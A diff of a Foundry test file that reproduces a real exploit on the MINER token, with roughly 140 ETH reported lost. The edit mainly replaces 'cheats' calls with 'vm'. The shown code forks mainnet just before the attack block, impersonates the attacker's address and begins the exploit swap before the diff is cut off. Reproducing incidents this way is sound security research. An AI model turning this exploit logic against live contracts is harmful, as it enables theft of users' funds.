@@ -2,7 +2,6 @@
 pragma solidity ^0.8.24;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~140 $ETH
 // Attacker : https://etherscan.io/address/0xea75aec151f968b8de3789ca201a2a3a7faeefba
@@ -40,22 +39,21 @@ contract ContractTest is Test {
     IMinerUNIV3POOL pool = IMinerUNIV3POOL(0x732276168b421D4792E743711E1A48172EA574a2);
     IMiner MINER = IMiner(0xE77EC1bF3A5C95bFe3be7BDbACfe3ac1c7E454CD);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
         // evm_version Requires to be "shanghai"
-        cheats.createSelectFork("mainnet", 19_226_508 - 1);
-        cheats.label(address(MINER), "MINER");
-        cheats.label(address(pool), "MINER_Pool");
-        cheats.label(address(WETH), "WETH");
+        vm.createSelectFork("mainnet", 19_226_508 - 1);
+        vm.label(address(MINER), "MINER");
+        vm.label(address(pool), "MINER_Pool");
+        vm.label(address(WETH), "WETH");
     }
 
     function testExploit() public {
         emit log_named_uint("Attacker ETH balance before exploit", WETH.balanceOf(address(this)));
-        cheats.startPrank(attacker);
+        vm.startPrank(attacker);
         MINER.transfer(address(this), MINER.balanceOf(attacker));
         MINER.balanceOf(address(this));
-        cheats.stopPrank();
+        vm.stopPrank();
 
         bool zeroForOne = false;
         int256 amountSpecified = 999_999_999_999_999_998_000;
